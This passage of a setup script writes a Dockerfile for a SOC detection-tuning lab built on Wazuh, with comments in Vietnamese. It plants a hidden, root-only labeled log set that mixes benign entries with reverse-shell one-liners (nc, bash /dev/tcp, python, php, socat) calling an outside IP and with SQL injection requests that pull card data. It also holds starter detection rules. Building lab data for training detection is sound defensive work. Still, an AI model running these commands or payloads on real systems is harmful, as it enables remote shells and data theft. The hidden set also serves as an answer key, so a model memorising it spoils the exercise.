# /etc/default/locale + /etc/environment (PAM doc) + .bashrc cua user (xem phan cuoi Dockerfile).
ENV LANG=C.UTF-8
ENV LC_ALL=C.UTF-8
RUN printf 'LANG=C.UTF-8\nLC_ALL=C.UTF-8\n' > /etc/default/locale \
    && printf 'LANG=C.UTF-8\nLC_ALL=C.UTF-8\n' >> /etc/environment
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# === Decoder procmon (tach exe + command tu dong "host procmon: exe=... cmd=\"...\"") ===
RUN printf '%s\n' \
  '<decoder name="procmon">' \
  '  <program_name>^procmon$</program_name>' \
  '</decoder>' \
  '<decoder name="procmon-fields">' \
  '  <parent>procmon</parent>' \
  '  <regex type="pcre2">exe=(\S+)\s+cmd="([^"]*)"</regex>' \
  '  <order>exe, command</order>' \
  '</decoder>' \
  >> /var/ossec/etc/decoders/local_decoder.xml
#
# === Tap AN (root:0600) - SV khong doc duoc. shell: M=reverse shell that, B=lanh. ===
RUN mkdir -p /root/.hidden && printf '%s\n' \
  'B	Nov 19 01:00:00 web01 procmon: exe=/usr/bin/rsync cmd="rsync -az /srv backup-nc.example:/b" user=root' \
  'B	Nov 19 01:01:00 db-core procmon: exe=/usr/bin/sync cmd="sync" user=root' \
  'B	Nov 19 01:02:00 app02 procmon: exe=/opt/monitoring/health-nc cmd="health-nc --report" user=monit' \
  'B	Nov 19 01:03:00 web01 procmon: exe=/usr/bin/vim cmd="vim /srv/app.conf" user=root' \
  'B	Nov 19 01:04:00 web01 procmon: exe=/bin/tar cmd="tar cf /tmp/a.tar /srv" user=root' \
  'B	Nov 19 01:05:00 db-core procmon: exe=/usr/bin/psql cmd="psql -c select count(1)" user=postgres' \
  'B	Nov 19 01:06:00 app02 procmon: exe=/usr/bin/git cmd="git fetch origin" user=app' \
  'B	Nov 19 01:07:00 web01 procmon: exe=/usr/bin/scp cmd="scp report.pdf user@host:/inbox" user=root' \
  'B	Nov 19 01:08:00 web01 procmon: exe=/usr/bin/rsync cmd="rsync -a /logs /mnt/nc-archive" user=root' \
  'B	Nov 19 01:09:00 db-core procmon: exe=/opt/monitoring/health-nc cmd="health-nc --scan" user=monit' \
  'B	Nov 19 01:10:00 app02 procmon: exe=/usr/bin/node cmd="node server.js" user=app' \
  'B	Nov 19 01:11:00 web01 procmon: exe=/bin/systemctl cmd="systemctl restart nginx" user=root' \
  'B	Nov 19 01:12:00 db-core procmon: exe=/usr/bin/sync cmd="sync && echo done" user=root' \
  'B	Nov 19 01:13:00 app02 procmon: exe=/usr/bin/incrond cmd="incrond -n" user=root' \
  'B	Nov 19 01:14:00 web01 procmon: exe=/usr/bin/rsync cmd="rsync -avz /var/www /backup" user=root' \
  'B	Nov 19 01:15:00 db-core procmon: exe=/bin/ln cmd="ln -s /opt/a /opt/b" user=root' \
  'M	Nov 19 01:20:00 db-core procmon: exe=/bin/nc cmd="nc -e /bin/bash 198.51.100.7 9001" user=www-data' \
  'M	Nov 19 01:21:00 db-core procmon: exe=/usr/bin/ncat cmd="ncat --exec /bin/sh 198.51.100.7 9001" user=www-data' \
  'M	Nov 19 01:22:00 db-core procmon: exe=/bin/bash cmd="bash -c sh -i >& /dev/tcp/198.51.100.7/443 0>&1" user=www-data' \
  'M	Nov 19 01:23:00 app02 procmon: exe=/bin/sh cmd="sh -c exec 5<>/dev/tcp/198.51.100.7/80; cat <&5" user=app' \
  'M	Nov 19 01:24:00 web01 procmon: exe=/usr/bin/python3 cmd="python3 -c import socket,os,pty;s=socket.socket();s.connect((198.51.100.7,443));pty.spawn(/bin/bash)" user=www-data' \
  'M	Nov 19 01:25:00 app02 procmon: exe=/usr/bin/perl cmd="perl -e use Socket;socket(S,PF_INET,SOCK_STREAM,...);connect(S,...);exec(/bin/sh)" user=app' \
  'M	Nov 19 01:26:00 db-core procmon: exe=/usr/bin/php cmd="php -r \$s=fsockopen(198.51.100.7,443);exec(/bin/sh -i <&3 >&3 2>&3)" user=www-data' \
  'M	Nov 19 01:27:00 web01 procmon: exe=/bin/busybox cmd="busybox nc 198.51.100.7 443 -e /bin/sh" user=www-data' \
  'M	Nov 19 01:28:00 app02 procmon: exe=/usr/bin/socat cmd="socat exec:/bin/sh tcp:198.51.100.7:443" user=app' \
  'M	Nov 19 01:29:00 db-core procmon: exe=/usr/bin/ruby cmd="ruby -rsocket -e exit if fork;c=TCPSocket.new(198.51.100.7,443)" user=www-data' \
  > /root/.hidden/shell.tsv
#
# === Tap AN SQLi (root:0600). M=SQLi that, B=lanh. ===
RUN printf '%s\n' \
  'B	10.0.9.2 - - [19/Nov/2025:01:00:00 +0000] "GET /index.html HTTP/1.1" 200 1000' \
  'B	10.0.9.2 - - [19/Nov/2025:01:01:00 +0000] "GET /search?q=select+the+best+phone HTTP/1.1" 200 700' \
  'B	10.0.9.2 - - [19/Nov/2025:01:02:00 +0000] "GET /c/union-tshirts HTTP/1.1" 200 1200' \
  'B	10.0.9.2 - - [19/Nov/2025:01:03:00 +0000] "GET /products?order=price_asc HTTP/1.1" 200 900' \
  'B	10.0.9.2 - - [19/Nov/2025:01:04:00 +0000] "GET /blog/select-your-size HTTP/1.1" 200 1500' \
  'B	10.0.9.2 - - [19/Nov/2025:01:05:00 +0000] "GET /api/v1/items?id=42 HTTP/1.1" 200 64' \
  'B	10.0.9.2 - - [19/Nov/2025:01:06:00 +0000] "GET /search?q=union+of+colors HTTP/1.1" 200 530' \
  'B	10.0.9.2 - - [19/Nov/2025:01:07:00 +0000] "GET /cart/add?sku=1001 HTTP/1.1" 200 20' \
  'B	10.0.9.2 - - [19/Nov/2025:01:08:00 +0000] "GET /p/select-edition HTTP/1.1" 200 2200' \
  'B	10.0.9.2 - - [19/Nov/2025:01:09:00 +0000] "GET /help?topic=orders HTTP/1.1" 200 410' \
  'B	10.0.9.2 - - [19/Nov/2025:01:10:00 +0000] "GET /static/app.js HTTP/1.1" 200 88211' \
  'B	10.0.9.2 - - [19/Nov/2025:01:11:00 +0000] "GET /search?q=red+or+blue HTTP/1.1" 200 480' \
  'B	10.0.9.2 - - [19/Nov/2025:01:12:00 +0000] "GET /u/profile?name=select HTTP/1.1" 200 350' \
  'B	10.0.9.2 - - [19/Nov/2025:01:13:00 +0000] "GET /products?category=home HTTP/1.1" 200 980' \
  'B	10.0.9.2 - - [19/Nov/2025:01:14:00 +0000] "GET /search?q=unionpay+card HTTP/1.1" 200 610' \
  'B	10.0.9.2 - - [19/Nov/2025:01:15:00 +0000] "GET /faq HTTP/1.1" 200 1300' \
  'M	198.51.100.7 - - [19/Nov/2025:01:20:00 +0000] "GET /item?id=9+union+select+card,cvv+from+payments-- HTTP/1.1" 200 150000' \
  'M	198.51.100.7 - - [19/Nov/2025:01:21:00 +0000] "GET /item?id=9%27%20UNION%20SELECT%20card%20FROM%20payments HTTP/1.1" 200 120000' \
  'M	198.51.100.7 - - [19/Nov/2025:01:22:00 +0000] "GET /item?id=9+UNION+ALL+SELECT+card+FROM+payments HTTP/1.1" 200 98000' \
  'M	198.51.100.7 - - [19/Nov/2025:01:23:00 +0000] "GET /item?id=9+uni/**/on+sel/**/ect+card+FROM+payments HTTP/1.1" 200 77000' \
  'M	198.51.100.7 - - [19/Nov/2025:01:24:00 +0000] "GET /login?u=admin%27%20OR%20%271%27=%271 HTTP/1.1" 200 512' \
  'M	198.51.100.7 - - [19/Nov/2025:01:25:00 +0000] "GET /item?id=9+OR+1=1 HTTP/1.1" 200 60000' \
  'M	198.51.100.7 - - [19/Nov/2025:01:26:00 +0000] "GET /item?id=9%27%20or%20%271%27%3D%271 HTTP/1.1" 200 51000' \
  'M	198.51.100.7 - - [19/Nov/2025:01:27:00 +0000] "GET /item?id=9+UnIoN+SeLeCt+card+FROM+payments HTTP/1.1" 200 69000' \
  'M	198.51.100.7 - - [19/Nov/2025:01:28:00 +0000] "GET /item?id=0x393127+union+select+pass+from+users HTTP/1.1" 200 41000' \
  'M	198.51.100.7 - - [19/Nov/2025:01:29:00 +0000] "GET /item?id=9;DROP/**/TABLE/**/users-- HTTP/1.1" 200 30000' \
  > /root/.hidden/web.tsv
RUN chmod 700 /root/.hidden && chmod 600 /root/.hidden/*.tsv && chown -R root:root /root/.hidden
#
# === Helper nap-luat: kiem cu phap + cai luat vao /var/ossec (chay qua sudo boi ubuntu) ===
RUN printf '%s\n' \
  '#!/bin/bash' \
  '# nap-luat <file>: kiem cu phap roi cai vao /var/ossec/etc/rules/local_rules.xml' \
  'SRC="$1"; [ -f "$SRC" ] || { echo "khong thay $SRC"; exit 2; }' \
  'TMP=$(mktemp)' \
  'cp "$SRC" /var/ossec/etc/rules/local_rules.xml' \
  'chown root:wazuh /var/ossec/etc/rules/local_rules.xml 2>/dev/null; chmod 640 /var/ossec/etc/rules/local_rules.xml' \
  '# kiem cu phap: logtest nap ruleset; neu loi se bao' \
  'err=$(printf "x\\n" | /var/ossec/bin/wazuh-logtest 2>&1 >/dev/null | grep -iE "error|cannot load|invalid" | head -3)' \
  'if [ -n "$err" ]; then echo "$err"; exit 1; fi' \
  'exit 0' \
  > /usr/local/bin/nap-luat && chmod 755 /usr/local/bin/nap-luat
#
# === Cai LUAT GOC vao /var/ossec ngay tu dau (de luc moi vao da chay duoc) ===
# (local_rules.xml goc nam trong home SV sau khi ADD; o day dat 1 ban toi thieu de manager khoi dong khong loi.)
RUN printf '%s\n' \
  '<group name="local,detection_tuning,">' \
  '  <rule id="100230" level="10"><decoded_as>procmon</decoded_as><match>nc</match><description>Reverse shell suspected (goc)</description><mitre><id>T1059</id></mitre></rule>' \
  '  <rule id="100250" level="10"><if_sid>31100</if_sid><regex>select|union|or 1=1</regex><description>SQL injection suspected (goc)</description><mitre><id>T1190</id></mitre></rule>' \
  '</group>' \
  > /var/ossec/etc/rules/local_rules.xml && chown root:wazuh /var/ossec/etc/rules/local_rules.xml && chmod 640 /var/ossec/etc/rules/local_rules.xml
#
# === sudoers: ubuntu chi duoc chay logtest + nap-luat (KHONG sudo tu do -> khong doc duoc /root/.hidden) ===
RUN echo 'ubuntu ALL=(root) NOPASSWD: /var/ossec/bin/wazuh-logtest, /usr/local/bin/nap-luat' > /etc/sudoers.d/labtainer-tuning \
    && chmod 440 /etc/sudoers.d/labtainer-tuning
#
# === Entrypoint: khoi phuc quyen Wazuh + ensure_mgr (chong boot-race) truoc khi exec init ===
RUN printf '%s\n' \
  '#!/bin/bash' \
  'for u in wazuh-indexer wazuh-dashboard; do' \
  '  id "$u" >/dev/null 2>&1 || continue' \
  '  chown -R "$u:$u" /usr/share/$u /var/lib/$u /var/log/$u /etc/$u /run/$u 2>/dev/null' \
  'done' \
  'rm -f /var/ossec/queue/rids/* /var/ossec/etc/client.keys /var/ossec/queue/agents-timestamp 2>/dev/null' \
  'mgr_active(){ [ "$(systemctl is-active wazuh-manager 2>/dev/null)" = "active" ]; }' \
  '( for i in $(seq 1 30); do mgr_active && break; sleep 2; done; mgr_active || for r in 1 2 3; do systemctl restart wazuh-manager >/dev/null 2>&1; for j in $(seq 1 25); do mgr_active && break 2; sleep 3; done; done ) &' \
  'exec /sbin/init --log-target=journal 3>&1' \
  > /entrypoint.sh && chmod +x /entrypoint.sh
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
RUN mkdir -p /home/$user_name/.local && echo "soc-detection-tuning" > /home/$user_name/.local/.labname \
    && chown $user_name:$user_name /home/$user_name/.local/.labname 2>/dev/null || true
# Locale cho shell tuong tac (nano) - .bashrc chac an nhat du terminal mo kieu nao.
RUN printf '\nexport LANG=C.UTF-8\nexport LC_ALL=C.UTF-8\n' >> /home/$user_name/.bashrc \
    && chown $user_name:$user_name /home/$user_name/.bashrc 2>/dev/null || true
CMD ["/entrypoint.sh"]
__TUN__

echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB"/siem/_bin/* 2>/dev/null || true
find "$LAB" -type f -exec sed -i 's/\r$//' {} +
echo ">> XONG. Tiep theo:  cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-detection-tuning"
